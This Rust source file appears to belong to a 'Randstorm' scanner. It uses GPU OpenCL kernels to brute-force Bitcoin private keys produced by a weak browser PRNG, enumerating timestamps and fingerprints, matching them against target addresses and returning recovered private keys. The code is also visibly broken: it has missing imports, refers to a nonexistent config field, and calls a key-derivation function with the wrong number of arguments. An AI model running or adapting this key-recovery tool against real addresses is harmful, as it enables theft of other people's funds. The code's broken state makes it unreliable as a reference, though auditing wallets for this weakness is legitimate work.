//! GPU Integration for Randstorm Scanner
//!
//! This module handles OpenCL GPU acceleration for the Randstorm vulnerability scanner.
//! It follows the existing GPU patterns from gpu_solver.rs while being optimized for
//! the specific requirements of browser fingerprint enumeration.

use anyhow::{Context, Result};
use bitcoin::secp256k1::{PublicKey, SecretKey};
#[cfg(feature = "gpu")]
use ocl::enums::DeviceInfoResult;
#[cfg(feature = "gpu")]
use ocl::{Buffer, Context as OclContext, Device, Kernel, Platform, Program, Queue};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

use super::config::ScanConfig;
use super::fingerprint::BrowserFingerprint;

/// GPU-accelerated Randstorm scanner
#[cfg(feature = "gpu")]
pub struct GpuScanner {
    queue: Queue,
    kernel: Kernel,
    device: Device,
    keys_checked: Arc<AtomicU64>,
    running: Arc<AtomicBool>,
}

/// Stub for non-GPU builds
#[cfg(not(feature = "gpu"))]
pub struct GpuScanner {
    keys_checked: Arc<AtomicU64>,
    running: Arc<AtomicBool>,
}

/// Result from GPU batch processing
#[derive(Debug)]
pub struct GpuBatchResult {
    pub keys_processed: u64,
    pub matches_found: Vec<MatchedKey>,
    pub elapsed_ms: u64,
}

/// A key that matched a target address
#[derive(Debug, Clone)]
pub struct MatchedKey {
    pub private_key: SecretKey,
    pub public_key: PublicKey,
    pub address: String,
    pub fingerprint: BrowserFingerprint,
}

impl GpuScanner {
    /// Initialize GPU scanner with OpenCL
    #[cfg(feature = "gpu")]
    pub fn new(
        config: ScanConfig,
        engine: super::prng::MathRandomEngine,
        seed_override: Option<u64>,
        include_uncompressed: bool,
    ) -> Result<Self> {
        // Select platform and device (following gpu_solver.rs pattern)
        let platform = Platform::default();
        let device = Device::first(platform).context("No OpenCL device found")?;

        println!("🔧 Initializing GPU: {}", device.name()?);
        let max_compute_units_result = device.info(ocl::enums::DeviceInfo::MaxComputeUnits)?;
        let global_mem = device.info(ocl::enums::DeviceInfo::GlobalMemSize)?;

        println!(
            "   Max compute units: {}",
            if let DeviceInfoResult::MaxComputeUnits(units) = max_compute_units_result {
                units
            } else {
                0
            }
        );
        println!("   Max work group size: {}", device.max_wg_size()?);
        println!(
            "   Global memory: {} MB",
            if let DeviceInfoResult::GlobalMemSize(mem) = global_mem {
                mem / 1024 / 1024
            } else {
                0
            }
        );

        // Create context and queue
        let context = OclContext::builder()
            .platform(platform)
            .devices(device)
            .build()
            .context("Failed to create OpenCL context")?;

        let queue = Queue::new(&context, device, None).context("Failed to create command queue")?;

        // Load and compile kernel
        let kernel_source = include_str!("../../../cl/randstorm_scan.cl");
        let program = Program::builder()
            .src(kernel_source)
            .devices(device)
            .build(&context)
            .context("Failed to build OpenCL program")?;

        let kernel = Kernel::builder()
            .name("randstorm_check")
            .program(&program)
            .queue(queue.clone())
            .build()
            .context("Failed to create kernel")?;

        Ok(Self {
            queue,
            kernel,
            device,
            keys_checked: Arc::new(AtomicU64::new(0)),
            running: Arc::new(AtomicBool::new(true)),
        })
    }

    /// Stub for non-GPU builds
    #[cfg(not(feature = "gpu"))]
    pub fn new(
        _config: ScanConfig,
        _engine: super::prng::MathRandomEngine,
        _seed_override: Option<u64>,
        _include_uncompressed: bool,
    ) -> Result<Self> {
        anyhow::bail!("GPU support not compiled in. Rebuild with --features gpu")
    }

    /// Calculate optimal batch size based on device capabilities
    #[cfg(feature = "gpu")]
    pub fn calculate_batch_size(&self) -> Result<usize> {
        let max_compute_units_result = self.device.info(ocl::enums::DeviceInfo::MaxComputeUnits)?;
        let max_compute_units =
            if let DeviceInfoResult::MaxComputeUnits(units) = max_compute_units_result {
                units as usize
            } else {
                16 // Fallback default
            };
        let max_wg_size = self.device.max_wg_size()? as usize;

        // Follow gpu_solver.rs pattern: multiply compute units by work group size
        let optimal_batch = max_compute_units * max_wg_size * 64;

        // Cap at config max or 1M keys per batch
        let max_batch = self.config.batch_size.unwrap_or(1_000_000);
        Ok(optimal_batch.min(max_batch))
    }

    #[cfg(not(feature = "gpu"))]
    pub fn calculate_batch_size(&self) -> Result<usize> {
        Ok(1000) // Stub
    }

    /// Process a batch of fingerprints on GPU
    #[cfg(feature = "gpu")]
    pub fn process_batch(
        &mut self,
        fingerprints: &[BrowserFingerprint],
        target_addresses: &[Vec<u8>], // 20-byte address hashes
        num_targets: u32,
    ) -> Result<GpuBatchResult> {
        let start_time = Instant::now();
        let batch_size = fingerprints.len();

        if batch_size == 0 {
            return Ok(GpuBatchResult {
                keys_processed: 0,
                matches_found: Vec::new(),
                elapsed_ms: 0,
            });
        }

        // Prepare input data: pack fingerprints into GPU format
        let mut input_data = Vec::with_capacity(batch_size * 3);
        for fp in fingerprints {
            input_data.push(fp.timestamp_ms);
            input_data.push(fp.screen_width as u64);
            input_data.push(fp.screen_height as u64);
        }

        // Flatten target addresses into single buffer
        let mut target_data = Vec::with_capacity(num_targets as usize * 20);
        for i in 0..num_targets as usize {
            target_data.extend_from_slice(&target_addresses[i]);
        }

        // Create GPU buffers
        let input_buffer = Buffer::<u64>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_READ_ONLY)
            .len(input_data.len())
            .build()
            .context("Failed to create input buffer")?;

        let target_buffer = Buffer::<u8>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_READ_ONLY)
            .len(target_data.len())
            .build()
            .context("Failed to create target buffer")?;

        let output_buffer = Buffer::<u32>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_WRITE_ONLY)
            .len(batch_size)
            .build()
            .context("Failed to create output buffer")?;

        // Write input data to GPU
        input_buffer
            .write(&input_data)
            .enq()
            .context("Failed to write input data")?;
        target_buffer
            .write(&target_data)
            .enq()
            .context("Failed to write target data")?;

        // Set kernel arguments
        self.kernel.set_arg(0, &input_buffer)?;
        self.kernel.set_arg(1, batch_size as u32)?;
        self.kernel.set_arg(2, &target_buffer)?;
        self.kernel.set_arg(3, num_targets)?;
        self.kernel.set_arg(4, &output_buffer)?;

        // Execute kernel
        unsafe {
            self.kernel
                .cmd()
                .queue(&self.queue)
                .global_work_size(batch_size)
                .enq()
                .context("Failed to execute kernel")?;
        }

        // Read results
        let mut results = vec![0u32; batch_size];
        output_buffer
            .read(&mut results)
            .enq()
            .context("Failed to read results")?;

        // Process matches
        let mut matches = Vec::new();
        let secp = Secp256k1::new();

        for (idx, &match_flag) in results.iter().enumerate() {
            if match_flag > 0 {
                // Recreate the key from fingerprint (CPU verification)
                let fp = &fingerprints[idx];
                if let Ok(secret_key) = self.derive_key_from_fingerprint(fp) {
                    let public_key = PublicKey::from_secret_key(&secp, &secret_key);
                    // Generate address for verification
                    let address =
                        crate::scans::randstorm::derivation::derive_p2pkh_address(&public_key);

                    matches.push(MatchedKey {
                        private_key: secret_key,
                        public_key,
                        address,
                        fingerprint: fp.clone(),
                    });
                }
            }
        }

        let elapsed_ms = start_time.elapsed().as_millis() as u64;
        self.keys_checked
            .fetch_add(batch_size as u64, Ordering::Relaxed);

        Ok(GpuBatchResult {
            keys_processed: batch_size as u64,
            matches_found: matches,
            elapsed_ms,
        })
    }

    /// Derive private key from browser fingerprint (CPU implementation for verification)
    #[allow(dead_code)]
    fn derive_key_from_fingerprint(
        &self,
        fp: &BrowserFingerprint,
        engine: super::prng::MathRandomEngine,
        seed_override: Option<u64>,
    ) -> Result<SecretKey> {
        use super::prng::bitcoinjs_v013::BitcoinJsV013Prng;

        let key_bytes =
            BitcoinJsV013Prng::generate_privkey_bytes(fp.timestamp_ms, engine, seed_override);
        SecretKey::from_slice(&key_bytes).context("Invalid secret key generated from fingerprint")
    }

    /// Get total keys checked
    pub fn keys_checked(&self) -> u64 {
        self.keys_checked.load(Ordering::Relaxed)
    }

    /// Stop the scanner
    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    /// Check if scanner is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bitcoin::secp256k1::Secp256k1;

    #[test]
    #[ignore] // Requires OpenCL device
    fn test_gpu_scanner_initialization() {
        use crate::scans::randstorm::prng::MathRandomEngine;
        let config = ScanConfig::default();
        let engine = MathRandomEngine::V8Mwc1616;
        let scanner = GpuScanner::new(config, engine, None, true);

        // Should succeed if OpenCL is available
        if scanner.is_ok() {
            let scanner = scanner.unwrap();
            assert!(scanner.calculate_batch_size().unwrap() > 0);
        }
    }

    #[test]
    fn test_key_derivation_from_fingerprint() {
        use crate::scans::randstorm::prng::MathRandomEngine;
        let config = ScanConfig::default();
        let engine = MathRandomEngine::V8Mwc1616;
        let scanner = GpuScanner::new(config, engine, None, true);

        if let Ok(scanner) = scanner {
            let fp = BrowserFingerprint {
                timestamp_ms: 1633024800000,
                screen_width: 1920,
                screen_height: 1080,
                color_depth: 24,
                timezone_offset: -420,
                language: "en-US".to_string(),
                platform: "Win32".to_string(),
                user_agent: "Mozilla/5.0".to_string(),
            };

            let key = scanner.derive_key_from_fingerprint(&fp, MathRandomEngine::V8Mwc1616, None);
            assert!(key.is_ok());

            // Verify key is valid for secp256k1
            let secp = Secp256k1::new();
            let public_key = PublicKey::from_secret_key(&secp, &key.unwrap());
            assert!(public_key.to_string().len() > 0);
        }
    }
}
